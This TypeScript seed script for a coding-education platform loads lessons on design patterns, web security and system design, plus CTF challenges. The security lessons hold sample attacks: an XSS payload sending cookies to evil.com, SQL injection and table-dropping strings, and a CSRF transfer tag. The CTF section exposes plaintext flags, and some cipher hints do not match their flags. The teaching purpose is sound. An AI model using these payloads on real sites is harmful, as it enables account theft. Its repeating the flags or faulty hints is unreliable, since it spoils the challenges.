    { patternKey: "observer", name: "Observer", category: "Behavioral", orderIndex: 1, planAccess: "free" as const,
      description: "Define a one-to-many dependency so all dependents are notified when one object changes state.",
      intent: "Automatically propagate state changes to any number of dependent objects without tight coupling.",
      structure: "Subject maintains a list of Observer interfaces; notifies all on state change; observers implement update().",
      codeExample: `interface Observer { update(event: string, data: unknown): void; }\nclass EventBus {\n  private listeners = new Map<string, Observer[]>();\n  subscribe(event: string, obs: Observer) {\n    if (!this.listeners.has(event)) this.listeners.set(event, []);\n    this.listeners.get(event)!.push(obs);\n  }\n  publish(event: string, data: unknown) {\n    this.listeners.get(event)?.forEach(o => o.update(event, data));\n  }\n}\nclass EmailNotifier implements Observer {\n  update(event: string, data: unknown) { console.log('Email for', event, data); }\n}\nconst bus = new EventBus();\nbus.subscribe('user.registered', new EmailNotifier());\nbus.publish('user.registered', { email: 'alice@example.com' });`,
      useCase: "DOM events, MVC model-view sync, real-time notifications, Redux/Zustand state management.",
      relatedPatterns: ["mediator", "singleton", "strategy"] },
    { patternKey: "strategy", name: "Strategy", category: "Behavioral", orderIndex: 2, planAccess: "free" as const,
      description: "Define a family of interchangeable algorithms and let clients choose one at runtime.",
      intent: "Eliminate conditionals by encapsulating each algorithm variant behind a common interface.",
      structure: "Context class holds a Strategy interface reference; concrete strategies implement the algorithm; context delegates to strategy.",
      codeExample: `interface SortStrategy { sort(data: number[]): number[]; }\nclass QuickSort implements SortStrategy {\n  sort(data: number[]) { return [...data].sort((a, b) => a - b); }\n}\nclass BubbleSort implements SortStrategy {\n  sort(data: number[]) {\n    const a = [...data];\n    for (let i = 0; i < a.length; i++)\n      for (let j = 0; j < a.length - i - 1; j++)\n        if (a[j] > a[j+1]) [a[j], a[j+1]] = [a[j+1], a[j]];\n    return a;\n  }\n}\nclass Sorter {\n  constructor(private strategy: SortStrategy) {}\n  sort(data: number[]) { return this.strategy.sort(data); }\n}`,
      useCase: "Payment methods, compression algorithms, route planning, validation rule sets.",
      relatedPatterns: ["state", "template-method", "decorator"] },
    { patternKey: "command", name: "Command", category: "Behavioral", orderIndex: 3, planAccess: "free" as const,
      description: "Encapsulate a request as an object to enable undo/redo, queuing, and logging.",
      intent: "Turn requests into objects that can be stored, queued, logged, and reversed.",
      structure: "Command interface with execute() and undo(); Invoker stores and calls commands; Receiver does the real work.",
      codeExample: `interface Command { execute(): void; undo(): void; }\nclass TextEditor { private text = '';\n  insert(pos: number, s: string) { this.text = this.text.slice(0,pos) + s + this.text.slice(pos); }\n  delete(pos: number, len: number) { this.text = this.text.slice(0,pos) + this.text.slice(pos+len); }\n  getText() { return this.text; }\n}\nclass InsertCmd implements Command {\n  constructor(private ed: TextEditor, private pos: number, private s: string) {}\n  execute() { this.ed.insert(this.pos, this.s); }\n  undo() { this.ed.delete(this.pos, this.s.length); }\n}\nclass History { private stack: Command[] = [];\n  exec(c: Command) { c.execute(); this.stack.push(c); }\n  undo() { this.stack.pop()?.undo(); }\n}`,
      useCase: "Text editor undo/redo, transactional systems, task schedulers, macro recording.",
      relatedPatterns: ["memento", "observer", "chain-of-responsibility"] },
    { patternKey: "iterator", name: "Iterator", category: "Behavioral", orderIndex: 4, planAccess: "free" as const,
      description: "Provide a uniform way to traverse elements of a collection without exposing its structure.",
      intent: "Decouple traversal logic from the collection, allowing multiple independent traversals.",
      structure: "Iterator interface with hasNext()/next(); Collection returns a new iterator instance; client uses iterator without knowing collection internals.",
      codeExample: `class Range {\n  constructor(private start: number, private end: number, private step = 1) {}\n  [Symbol.iterator]() {\n    let cur = this.start;\n    const { end, step } = this;\n    return {\n      next(): IteratorResult<number> {\n        if (cur <= end) { const v = cur; cur += step; return { value: v, done: false }; }\n        return { value: undefined as never, done: true };\n      }\n    };\n  }\n}\nfor (const n of new Range(1, 9, 2)) console.log(n); // 1 3 5 7 9`,
      useCase: "Custom collection traversal, lazy sequences, tree/graph traversal strategies.",
      relatedPatterns: ["composite", "factory-method", "visitor"] },
    { patternKey: "template-method", name: "Template Method", category: "Behavioral", orderIndex: 5, planAccess: "basic" as const,
      description: "Define the skeleton of an algorithm in a base class, deferring some steps to subclasses.",
      intent: "Avoid code duplication by implementing the invariant parts of an algorithm in the base class and letting subclasses fill in the variable parts.",
      structure: "Abstract class with a final template method calling abstract hook methods; concrete subclasses implement the hooks.",
      codeExample: `abstract class DataExporter {\n  export(data: unknown[]): string {\n    const filtered = this.filter(data);\n    return this.format(filtered);\n  }\n  protected filter(data: unknown[]): unknown[] { return data; } // optional hook\n  protected abstract format(data: unknown[]): string;\n}\nclass CSVExporter extends DataExporter {\n  protected format(data: unknown[]) {\n    return data.map(r => Object.values(r as object).join(',')).join('\\n');\n  }\n}\nclass JSONExporter extends DataExporter {\n  protected format(data: unknown[]) { return JSON.stringify(data, null, 2); }\n}`,
      useCase: "Data export pipelines, test frameworks (setUp/tearDown), game AI behaviour trees.",
      relatedPatterns: ["strategy", "factory-method"] },
    { patternKey: "state", name: "State", category: "Behavioral", orderIndex: 6, planAccess: "basic" as const,
      description: "Allow an object to alter its behaviour when its internal state changes.",
      intent: "Replace large state-dependent conditionals with state objects that encapsulate state-specific behaviour.",
      structure: "Context holds a State interface reference; concrete State classes implement behaviour and trigger transitions.",
      codeExample: `interface TLState { next(): TLState; signal(): string; }\nclass Red implements TLState { next() { return new Green(); } signal() { return 'STOP'; } }\nclass Green implements TLState { next() { return new Yellow(); } signal() { return 'GO'; } }\nclass Yellow implements TLState { next() { return new Red(); } signal() { return 'CAUTION'; } }\nclass TrafficLight {\n  private state: TLState = new Red();\n  change() { this.state = this.state.next(); }\n  signal() { return this.state.signal(); }\n}\nconst tl = new TrafficLight();\nconsole.log(tl.signal()); // STOP\ntl.change(); console.log(tl.signal()); // GO`,
      useCase: "Traffic lights, vending machines, order lifecycle workflows, TCP connection states.",
      relatedPatterns: ["strategy", "singleton"] },
    { patternKey: "chain-of-responsibility", name: "Chain of Responsibility", category: "Behavioral", orderIndex: 7, planAccess: "pro" as const,
      description: "Pass a request along a chain of handlers until one handles it.",
      intent: "Decouple senders from receivers by giving multiple handlers a chance to process the request.",
      structure: "Handler interface with setNext() and handle(); each concrete handler processes or forwards the request.",
      codeExample: `type Next = () => void;\ntype MW = (req: {user?: string}, next: Next) => void;\nfunction compose(...mws: MW[]) {\n  return (req: {user?: string}) => {\n    let i = 0;\n    const dispatch = () => { const fn = mws[i++]; if (fn) fn(req, dispatch); };\n    dispatch();\n  };\n}\nconst pipeline = compose(\n  (req, next) => { console.log('Auth'); next(); },\n  (req, next) => { console.log('RateLimit'); next(); },\n  (req, _next) => { console.log('Handle:', req); }\n);\npipeline({});`,
      useCase: "Express/Koa middleware, event bubbling, logging pipelines, approval workflows.",
      relatedPatterns: ["command", "decorator", "observer"] },
    { patternKey: "mediator", name: "Mediator", category: "Behavioral", orderIndex: 8, planAccess: "pro" as const,
      description: "Encapsulate how a set of objects interact, reducing direct dependencies between them.",
      intent: "Replace many-to-many object communication with a central mediator, reducing coupling.",
      structure: "Mediator interface defines communication protocol; colleagues hold a reference to the mediator and communicate through it.",
      codeExample: `interface Mediator { send(msg: string, sender: ChatUser): void; }\nclass ChatRoom implements Mediator {\n  private users: ChatUser[] = [];\n  register(u: ChatUser) { this.users.push(u); }\n  send(msg: string, sender: ChatUser) {\n    this.users.filter(u => u !== sender).forEach(u => u.receive(sender.name + ': ' + msg));\n  }\n}\nclass ChatUser {\n  constructor(public name: string, private med: Mediator) {}\n  say(msg: string) { this.med.send(msg, this); }\n  receive(msg: string) { console.log(this.name + ' received:', msg); }\n}\nconst room = new ChatRoom();\nconst alice = new ChatUser('Alice', room);\nroom.register(alice);\nalice.say('hi');`,
      useCase: "Chat rooms, air traffic control systems, UI form components, event bus architectures.",
      relatedPatterns: ["observer", "facade"] },
    { patternKey: "memento", name: "Memento", category: "Behavioral", orderIndex: 9, planAccess: "pro" as const,
      description: "Capture and restore an object's internal state without exposing its implementation.",
      intent: "Enable undo/redo and snapshots without violating encapsulation by externalising state into a memento object.",
      structure: "Originator creates and restores from Mementos; Caretaker stores them; Memento exposes no internals to the caretaker.",
      codeExample: `class Snapshot { constructor(public readonly content: string) {} }\nclass Editor {\n  private content = '';\n  type(text: string) { this.content += text; }\n  save(): Snapshot { return new Snapshot(this.content); }\n  restore(s: Snapshot) { this.content = s.content; }\n  getText() { return this.content; }\n}\nconst ed = new Editor();\ned.type('Hello');\nconst snap = ed.save();\ned.type(' World');\nconsole.log(ed.getText()); // Hello World\ned.restore(snap);\nconsole.log(ed.getText()); // Hello`,
      useCase: "Text editor undo history, game save/load, database transaction rollback.",
      relatedPatterns: ["command", "iterator"] },
    { patternKey: "visitor", name: "Visitor", category: "Behavioral", orderIndex: 10, planAccess: "pro" as const,
      description: "Separate an algorithm from the object structure it operates on.",
      intent: "Add new operations to an object structure without modifying its classes, by double-dispatching to a visitor.",
      structure: "Element interface with accept(Visitor); Visitor interface with visitX() for each element type; concrete visitors implement operations.",
      codeExample: `interface Visitor { visitCircle(c: Circ): number; visitRect(r: Rect): number; }\nclass AreaVisitor implements Visitor {\n  visitCircle(c: Circ) { return Math.PI * c.r ** 2; }\n  visitRect(r: Rect) { return r.w * r.h; }\n}\ninterface Shape { accept(v: Visitor): number; }\nclass Circ implements Shape { constructor(public r: number) {} accept(v: Visitor) { return v.visitCircle(this); } }\nclass Rect implements Shape { constructor(public w: number, public h: number) {} accept(v: Visitor) { return v.visitRect(this); } }\nconst shapes: Shape[] = [new Circ(5), new Rect(3, 4)];\nconst av = new AreaVisitor();\nshapes.forEach(s => console.log(s.accept(av)));`,
      useCase: "AST traversal in compilers, export to multiple formats, collecting statistics over a tree.",
      relatedPatterns: ["composite", "iterator"] },
    { patternKey: "interpreter", name: "Interpreter", category: "Behavioral", orderIndex: 11, planAccess: "pro" as const,
      description: "Define a representation for a language's grammar and an interpreter to evaluate sentences.",
      intent: "Parse and evaluate sentences in a simple language by building a composite expression tree.",
      structure: "Expression interface; Terminal expressions handle primitives; Non-terminal expressions compose sub-expressions.",
      codeExample: `interface Expr { eval(ctx: Map<string, number>): number; }\nclass Num implements Expr { constructor(private v: number) {} eval() { return this.v; } }\nclass Var implements Expr { constructor(private n: string) {} eval(ctx: Map<string, number>) { return ctx.get(this.n) ?? 0; } }\nclass Add implements Expr {\n  constructor(private l: Expr, private r: Expr) {}\n  eval(ctx: Map<string, number>) { return this.l.eval(ctx) + this.r.eval(ctx); }\n}\n// x + 5 where x = 10\nconst expr = new Add(new Var('x'), new Num(5));\nconsole.log(expr.eval(new Map([['x', 10]]))); // 15`,
      useCase: "Expression evaluators, query DSLs, configuration languages, regular expression engines.",
      relatedPatterns: ["composite", "visitor", "iterator"] },
  ];

  for (const p of patterns) {
    await prisma.designPatternLesson.upsert({
      where: { patternKey: p.patternKey },
      update: {},
      create: p,
    });
  }
  console.log("Design pattern lessons seeded.");

  // Seed Security Lessons
  const securityLessons = [
    { lessonKey: "owasp-injection", title: "Injection Attacks", category: "owasp", difficulty: "easy" as const, orderIndex: 1, planAccess: "free" as const,
      description: "SQL, command, and LDAP injection — how they work and how to prevent them.",
      content: `# Injection Attacks\n\nInjection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query.\n\n## SQL Injection Example\n\`\`\`sql\n-- Vulnerable query\nSELECT * FROM users WHERE email = '\${userInput}';\n\n-- Attacker input: ' OR '1'='1\nSELECT * FROM users WHERE email = '' OR '1'='1'; -- returns ALL users!\n\n-- Even worse: '; DROP TABLE users; --\n\`\`\`\n\n## Prevention\n\`\`\`typescript\n// Parameterised queries (safe)\nconst user = await db.query('SELECT * FROM users WHERE email = $1', [email]);\n\n// ORM (safe, uses parameterised queries internally)\nconst user = await prisma.user.findUnique({ where: { email } });\n\`\`\`\n\n## Key Prevention Strategies\n1. **Parameterised queries / Prepared statements** — never string-concatenate user input into queries\n2. **Input validation** — allowlist expected formats\n3. **Least privilege** — DB user should only have SELECT/INSERT, not DROP\n4. **Stored procedures** — can help if implemented correctly\n\n## Other Injection Types\n- **Command injection**: \`exec(userInput)\` — use exec with argument arrays\n- **LDAP injection**: sanitise LDAP special characters\n- **XML/XPath injection**: use parameterised XPath\n- **Template injection**: never eval user-supplied template strings` },
    { lessonKey: "owasp-auth", title: "Broken Authentication", category: "owasp", difficulty: "easy" as const, orderIndex: 2, planAccess: "free" as const,
      description: "Session management flaws, credential stuffing, and secure authentication patterns.",
      content: `# Broken Authentication\n\n## Common Vulnerabilities\n\n### Weak Passwords\n- Default credentials not changed\n- No password complexity requirements\n- Passwords stored in plaintext or with weak hashing (MD5, SHA1)\n\n### Session Management Flaws\n- Predictable session IDs\n- Sessions not invalidated on logout\n- Session fixation attacks\n- Long session timeouts\n\n### Credential Attacks\n- **Brute force**: trying all combinations\n- **Credential stuffing**: using leaked username/password pairs from other breaches\n- **Password spraying**: trying common passwords across many accounts\n\n## Secure Password Storage\n\`\`\`typescript\nimport bcrypt from 'bcryptjs';\n\n// Hash on signup\nconst hash = await bcrypt.hash(password, 12); // cost factor 12+\n\n// Verify on login\nconst valid = await bcrypt.compare(inputPassword, storedHash);\n\`\`\`\n\n## Secure Session Management\n- Use cryptographically random session IDs (128+ bits)\n- Regenerate session ID on privilege escalation\n- Set HttpOnly + Secure + SameSite cookies\n- Implement idle and absolute session timeouts\n- Invalidate server-side on logout\n\n## Multi-Factor Authentication\nAlways offer TOTP (e.g., Google Authenticator) or hardware keys (WebAuthn) as a second factor.` },
    { lessonKey: "owasp-xss", title: "Cross-Site Scripting (XSS)", category: "web-security", difficulty: "easy" as const, orderIndex: 3, planAccess: "free" as const,
      description: "Reflected, stored, and DOM-based XSS — detection and prevention.",
      content: `# Cross-Site Scripting (XSS)\n\nXSS allows attackers to inject client-side scripts into web pages viewed by other users.\n\n## Types\n\n### Reflected XSS\nPayload comes from the request (URL parameter) and is reflected back in the response.\n\`\`\`\nGET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>\n\`\`\`\n\n### Stored XSS\nPayload is stored in the database and rendered for all users who view the content.\nExample: a comment field that stores raw HTML and renders it.\n\n### DOM-based XSS\nPayload is executed due to client-side JavaScript reading from an attacker-controllable source (URL hash, postMessage) and writing to a dangerous sink (innerHTML).\n\n## Prevention\n\n### Output Encoding\n\`\`\`typescript\n// React JSX auto-escapes by default — safe\nreturn <div>{userInput}</div>;\n\n// dangerouslySetInnerHTML is a sink — avoid or sanitise first\nimport DOMPurify from 'dompurify';\nreturn <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;\n\`\`\`\n\n### Content Security Policy (CSP)\n\`\`\`\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\n\`\`\`\n\n### HttpOnly Cookies\nPrevent JavaScript from accessing session cookies even if XSS succeeds.` },
    { lessonKey: "csrf", title: "Cross-Site Request Forgery (CSRF)", category: "web-security", difficulty: "medium" as const, orderIndex: 4, planAccess: "free" as const,
      description: "How CSRF attacks work and token-based defenses.",
      content: `# CSRF — Cross-Site Request Forgery\n\nCSRF tricks an authenticated user's browser into making an unwanted request to your server.\n\n## Attack Scenario\n1. User logs into bank.com — gets session cookie\n2. User visits evil.com which contains:\n\`\`\`html\n<img src="https://bank.com/transfer?to=attacker&amount=10000" />\n\`\`\`\n3. Browser automatically includes session cookie\n4. Bank processes transfer as if user initiated it\n\n## Defenses\n\n### CSRF Tokens\n\`\`\`typescript\n// Server generates unique token per session/request\nconst csrfToken = crypto.randomBytes(32).toString('hex');\n// Embed in form: <input type="hidden" name="_csrf" value={csrfToken} />\n// Validate on POST: req.body._csrf === session.csrfToken\n\`\`\`\n\n### SameSite Cookies\n\`\`\`\nSet-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure\n\`\`\`\n- \`Strict\`: cookie not sent on cross-site requests at all\n- \`Lax\`: cookie sent on top-level navigations but not sub-resources\n\n### Double Submit Cookie\nSend CSRF token in both a cookie and a request header. Attackers can't read the cookie value from a different origin.\n\n### Custom Request Headers\n\`\`\`typescript\n// SPA: add custom header\nfetch('/api/transfer', {\n  headers: { 'X-Requested-With': 'XMLHttpRequest' }\n});\n// Simple CORS requests can't set custom headers — validates origin\n\`\`\`` },
    { lessonKey: "cryptography-basics", title: "Cryptography Fundamentals", category: "cryptography", difficulty: "medium" as const, orderIndex: 5, planAccess: "free" as const,
      description: "Symmetric/asymmetric encryption, hashing, and TLS fundamentals.",
      content: `# Cryptography Fundamentals\n\n## Symmetric Encryption\nSame key for encryption and decryption.\n- **AES-256-GCM** — current standard, authenticated encryption (AEAD)\n- Fast, suitable for large data\n- Key distribution problem: how do you share the key securely?\n\n\`\`\`typescript\nimport { createCipheriv, randomBytes } from 'crypto';\nconst key = randomBytes(32); // 256-bit key\nconst iv = randomBytes(12);  // 96-bit IV for GCM\nconst cipher = createCipheriv('aes-256-gcm', key, iv);\nconst encrypted = Buffer.concat([cipher.update(plaintext), cipher.final()]);\nconst authTag = cipher.getAuthTag();\n\`\`\`\n\n## Asymmetric Encryption\nPublic key encrypts, private key decrypts (or vice versa for signatures).\n- **RSA-2048+** — widely used, but slow\n- **ECDSA (P-256)** — smaller keys, faster, used in TLS and JWTs\n\n## Hashing\nOne-way function. Same input always produces same output. Cannot be reversed.\n- **SHA-256** — for data integrity, digital signatures, Merkle trees\n- **bcrypt/argon2** — for passwords (slow by design, salt included)\n\n## TLS Handshake (simplified)\n1. Client hello → sends supported cipher suites\n2. Server hello → picks cipher, sends certificate\n3. Client verifies certificate against CA store\n4. Key exchange (ECDH ephemeral) — derive shared session key\n5. Encrypted communication begins\n\n## Common Mistakes\n- Using ECB mode (reveals patterns)\n- Reusing IVs/nonces\n- Rolling your own crypto\n- Using MD5/SHA1 for passwords` },
    { lessonKey: "network-security", title: "Network Security Basics", category: "network-security", difficulty: "medium" as const, orderIndex: 6, planAccess: "basic" as const,
      description: "Firewalls, VPNs, network scanning, and common network attacks.",
      content: `# Network Security Basics\n\n## Firewalls\n- **Packet filter**: inspects IP headers (source/dest IP, port, protocol)\n- **Stateful inspection**: tracks connection state, allows return traffic\n- **Application-layer (WAF)**: understands HTTP, can detect SQLi, XSS\n\n## Common Network Attacks\n\n### Man-in-the-Middle (MITM)\nAttacker intercepts communications between two parties.\n- **ARP Spoofing**: send fake ARP replies to redirect LAN traffic\n- **SSL Stripping**: downgrade HTTPS to HTTP\n- **Defense**: HSTS, certificate pinning, DNSSEC\n\n### Denial of Service (DoS / DDoS)\n- SYN flood: exhaust TCP connection table with half-open connections\n- Amplification attacks: DNS/NTP amplification\n- Application layer: HTTP floods targeting expensive endpoints\n\n### Port Scanning with nmap\n\`\`\`bash\n# TCP SYN scan (fast, stealthy)\nnmap -sS -p 1-65535 target.com\n\n# Service/version detection\nnmap -sV target.com\n\n# OS detection\nnmap -O target.com\n\`\`\`\n\n## VPNs and Tunneling\n- **IPSec**: operates at network layer, encrypts all IP traffic\n- **OpenVPN/WireGuard**: TLS-based or noise-protocol VPNs\n- **SSH Tunneling**: forward local ports over encrypted SSH connection\n\n## Zero Trust Architecture\n"Never trust, always verify" — authenticate and authorise every request regardless of network location.` },
    { lessonKey: "cloud-security", title: "Cloud Security Essentials", category: "cloud-security", difficulty: "medium" as const, orderIndex: 7, planAccess: "basic" as const,
      description: "IAM, shared responsibility model, and common cloud misconfigurations.",
      content: `# Cloud Security Essentials\n\n## Shared Responsibility Model\n- **Cloud provider** secures: physical infrastructure, hypervisor, network fabric\n- **You** secure: OS, applications, data, IAM configurations\n\n## IAM Best Practices\n- **Least privilege**: grant minimum permissions needed\n- **No root account**: create IAM users, never use root for daily tasks\n- **MFA everywhere**: enable MFA on all accounts, especially privileged ones\n- **Rotate credentials**: rotate access keys regularly, use temporary STS tokens\n- **Resource-based policies**: use service roles, not long-lived keys\n\n## Common Misconfigurations\n\n### Public S3 Buckets\n\`\`\`json\n// DANGEROUS — never do this\n{ \"Effect\": \"Allow\", \"Principal\": \"*\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::my-bucket/*\" }\n\`\`\`\n\n### Overly Permissive Security Groups\n- Avoid \`0.0.0.0/0\` on SSH (port 22) or RDP (port 3389)\n- Use VPN or bastion hosts for admin access\n\n### Unencrypted EBS Volumes / RDS\n- Enable encryption at rest on all storage\n- Use KMS with customer-managed keys for sensitive data\n\n## Container Security\n- Run containers as non-root\n- Use read-only filesystems where possible\n- Scan images with Trivy/Snyk before deployment\n- Set resource limits (CPU, memory) to prevent DoS` },
  ];

  for (const lesson of securityLessons) {
    await prisma.securityLesson.upsert({
      where: { lessonKey: lesson.lessonKey },
      update: {},
      create: lesson,
    });
  }
  console.log("Security lessons seeded.");

  // Seed CTF Challenges (flags are bcrypt hashed)
  const ctfChallenges = [
    { challengeKey: "web-001", title: "Cookie Monster", category: "web-security", difficulty: "easy", points: 100, planAccess: "free" as const,
      description: "A login page sets a suspicious cookie after authentication. Inspect it carefully — the flag is hidden in plain sight.",
      flagHash: await bcrypt.hash("EYF{c00k13s_4r3_d3l1c10us}", 10),
      hints: ["Check the Set-Cookie header in your browser DevTools", "Try base64 decoding the cookie value", "The format is EYF{...}"] },
    { challengeKey: "web-002", title: "Robots Allowed", category: "web-security", difficulty: "easy", points: 150, planAccess: "free" as const,
      description: "Sometimes webmasters accidentally reveal hidden paths. Check where bots are told not to go.",
      flagHash: await bcrypt.hash("EYF{r0b0ts_kn0w_s3cr3ts}", 10),
      hints: ["What file do web crawlers check first?", "Visit /robots.txt", "The disallowed path leads to the flag"] },
    { challengeKey: "crypto-001", title: "Caesar's Secret", category: "cryptography", difficulty: "easy", points: 100, planAccess: "free" as const,
      description: "You intercepted: 'HBE{pnrfne_1f_n_3n5l_p1cu3e}'. The general's cipher is ancient but the key is the classic shift.",
      flagHash: await bcrypt.hash("EYF{caesar_1s_a_3a5y_c1ph3r}", 10),
      hints: ["ROT13 is a Caesar cipher with shift 13", "Try shifting each letter by 13 positions", "EYF becomes HBE with shift 13"] },
    { challengeKey: "crypto-002", title: "Base Jumper", category: "cryptography", difficulty: "medium", points: 200, planAccess: "free" as const,
      description: "Decode this to find the flag: 45594637 623435 355f6d 345f5f 683472 64337d. Hint: hex → ascii → base64.",
      flagHash: await bcrypt.hash("EYF{b45e_m4__h4rd3}", 10),
      hints: ["Convert the hex pairs to ASCII characters first", "The resulting string might need further decoding", "Try base64 decoding the ASCII result"] },
    { challengeKey: "forensics-001", title: "Metadata Trail", category: "forensics", difficulty: "medium", points: 250, planAccess: "basic" as const,
      description: "An image was sent from a whistleblower. The flag is hidden in the EXIF metadata. Use exiftool or similar to extract it.",
      flagHash: await bcrypt.hash("EYF{3x1f_d474_l34ks}", 10),
      hints: ["EXIF data stores camera settings, GPS, and custom fields", "Look in the 'Comment' or 'Artist' EXIF fields", "exiftool image.jpg will show all metadata"] },
  ];

  for (const c of ctfChallenges) {
    await prisma.cTFChallenge.upsert({
      where: { challengeKey: c.challengeKey },
      update: {},
      create: c,
    });
  }
  console.log("CTF challenges seeded.");

  // Seed System Design Questions
  const systemDesignQuestions = [
    { slug: "url-shortener", title: "Design a URL Shortener", category: "web-services", difficulty: "easy" as const, planAccess: "free" as const,
      description: "Design a system like bit.ly that converts long URLs into short ones and redirects users. Handle 100M writes/day and 10B reads/day.",
      approach: "Use base62 encoding (a-z, A-Z, 0-9) to generate 7-char short codes from an auto-incrementing ID or random hash. Store mappings in a relational DB (PostgreSQL). Cache hot URLs in Redis (LRU, 20% of entries serve 80% of traffic). Put a CDN in front for redirect caching.",
      components: ["API servers (stateless, horizontally scalable)", "PostgreSQL for URL mappings (read replicas for scale)", "Redis cache (LRU eviction, ~20GB for top URLs)", "CDN for redirect caching at edge", "Analytics service (Kafka + ClickHouse for click events)"],
      tradeoffs: "Random IDs are URL-safe but harder to shard; sequential IDs are easy to shard but guessable. Write-through cache ensures consistency but adds latency; write-around is faster but risks cache misses on first access." },
    { slug: "rate-limiter", title: "Design a Rate Limiter", category: "infrastructure", difficulty: "easy" as const, planAccess: "free" as const,
      description: "Design a distributed rate limiting service that throttles API requests per user/IP to prevent abuse.",
      approach: "Use Redis for atomic counters. Token bucket algorithm: store (tokens, last_refill_time) per key, use Lua script for atomic read-modify-write. For sliding window: store request timestamps in a Redis sorted set (ZADD/ZRANGEBYSCORE). Apply limits as middleware before routing.",
      components: ["Redis cluster for counter storage", "Lua scripts for atomic operations", "API gateway integration (or per-service middleware)", "Config service for per-client limits", "Prometheus metrics for throttle rate monitoring"],
      tradeoffs: "Fixed window is simple but allows 2x bursts at window boundaries. Sliding window log is accurate but memory-intensive (O(requests) per user). Token bucket allows short bursts but is more complex to implement correctly in a distributed system." },
    { slug: "design-twitter", title: "Design Twitter / X", category: "social-media", difficulty: "medium" as const, planAccess: "free" as const,
      description: "Design a microblogging platform supporting posting tweets, following users, and a personalised home timeline for 300M DAU.",
      approach: "Hybrid fan-out: for users with <10k followers, push tweets to follower timelines in Redis on write (fan-out on write). For celebrities (>10k), merge their tweets at read time (fan-out on read). Store tweets in Cassandra (time-series, high write throughput). Media stored in S3 behind CDN.",
      components: ["Write API (tweet creation, follow/unfollow)", "Timeline service (Redis sorted sets, O(1) read)", "Tweet store (Cassandra, partitioned by user_id + time)", "Search index (Elasticsearch for full-text tweet search)", "CDN + S3 for media", "Notification service (WebSockets + push)"],
      tradeoffs: "Fan-out on write gives fast reads but wastes writes for celebrities. Fan-out on read is efficient for celebrities but slow for users with many follows. Hybrid adds complexity but is what Twitter actually uses." },
    { slug: "design-chat", title: "Design WhatsApp / Chat System", category: "messaging", difficulty: "medium" as const, planAccess: "free" as const,
      description: "Design a real-time 1:1 and group messaging system with delivery receipts, supporting 2B users.",
      approach: "Use WebSockets for persistent connections between clients and chat servers. Each server handles ~100k connections. Use a message queue (Kafka) for async delivery and fan-out to group members. Store messages in Cassandra (partition by conversation_id). Use Zookeeper or consistent hashing to route users to the right chat server.",
      components: ["WebSocket servers (stateful, one per connection)", "Load balancer (sticky sessions for WebSocket)", "Kafka for message delivery guarantees", "Cassandra for message storage (time-series per conversation)", "Redis for online presence and unread counts", "Push notification service (APNS, FCM) for offline users"],
      tradeoffs: "WebSockets require sticky sessions, complicating horizontal scaling. Cassandra gives high write throughput but eventual consistency. Kafka adds latency (~ms) but guarantees at-least-once delivery." },
    { slug: "design-netflix", title: "Design Netflix / Video Streaming", category: "media", difficulty: "medium" as const, planAccess: "basic" as const,
      description: "Design a video streaming platform serving 200M concurrent viewers globally with adaptive bitrate streaming.",
      approach: "Upload pipeline: transcode videos to multiple resolutions (360p, 720p, 1080p, 4K) and codecs (H.264, H.265, AV1) using a distributed transcoding service. Chunk into 2-10 second segments. Store in S3. Serve via CDN (Netflix uses Open Connect, their own CDN). Use HLS/MPEG-DASH for adaptive bitrate. Recommendation engine uses ML on viewing history.",
      components: ["Upload API + transcoding workers (FFmpeg on AWS Batch)", "S3 for video chunks", "CDN / Open Connect for global delivery", "Streaming API (returns playlist manifests)", "Recommendation service (ML pipeline + real-time scoring)", "Metadata DB (video info, subtitles, thumbnails)"],
      tradeoffs: "Own CDN (like Open Connect) gives lower cost at scale but massive upfront investment. Third-party CDN is simpler but expensive. Pre-transcoding to all resolutions wastes storage; on-demand transcoding adds latency." },
    { slug: "design-uber", title: "Design Uber / Ride Sharing", category: "location-services", difficulty: "hard" as const, planAccess: "basic" as const,
      description: "Design a real-time ride-sharing platform matching 14M daily trips with sub-second driver matching.",
      approach: "Driver location updates every 4s go to a Location Service, stored in Redis using geohashing (S2 cells or H3). Trip matching service finds nearby drivers within radius, ranks by ETA. Use a supply/demand model for surge pricing. Payments are async via a queue to avoid blocking the trip flow.",
      components: ["Location service (Redis GEO commands, high-write)", "Matching service (geospatial query + ranking)", "Trip lifecycle service (state machine: requested→accepted→started→completed)", "Pricing service (real-time supply/demand)", "Payment service (async, idempotent)", "Notification service (push to driver/rider apps)"],
      tradeoffs: "Geohashing vs quadtrees: geohash is simpler but has edge effects at cell boundaries. Quadtrees are more accurate but complex. Real-time matching must be idempotent (driver can accept from multiple devices); use optimistic locking or compare-and-swap." },
    { slug: "distributed-cache", title: "Design a Distributed Cache (Redis)", category: "infrastructure", difficulty: "hard" as const, planAccess: "pro" as const,
      description: "Design a distributed in-memory cache supporting horizontal scaling, high availability, and sub-millisecond latency.",
      approach: "Consistent hashing ring distributes keys across nodes; virtual nodes (150+) improve load distribution. Each node has a primary + replica (leader-follower replication). Gossip protocol detects failures. LRU eviction via approximated LRU (Redis samples 5 random keys). Write-through for consistency; write-behind for performance.",
      components: ["Cache nodes (each: primary + 1-2 replicas)", "Consistent hashing ring with virtual nodes", "Gossip-based failure detection (every 1s heartbeat)", "Client library with local routing table (updated via cluster bus)", "Sentinel/Cluster manager for failover promotion"],
      tradeoffs: "Strong consistency requires sync replication (higher latency); eventual consistency allows async replication (risk of losing 1 write on failover). LRU eviction is simple but Least Frequently Used (LFU) is better for temporal access patterns." },
    { slug: "design-search", title: "Design a Web Search Engine", category: "search", difficulty: "hard" as const, planAccess: "pro" as const,
      description: "Design a Google-scale search engine that crawls 10B+ pages, builds an inverted index, and returns ranked results in <200ms.",
      approach: "Crawler: BFS from seed URLs, respect robots.txt, use polite crawling with 1 req/s per domain. Store pages in a distributed blob store. Build inverted index offline with MapReduce: term → list of (doc_id, tf-idf score, positions). Serving: use tiered index (hot in-memory + cold disk). Rank with BM25 + PageRank + ML signals.",
      components: ["Web crawler (distributed, politeness-aware, URL frontier priority queue)", "Document store (HDFS / S3 for raw pages)", "Index building pipeline (Spark/MapReduce)", "Serving index (sharded inverted index, in-memory for hot terms)", "Query parser + ranking service (BM25 + PageRank)", "Result cache (Redis for popular queries)"],
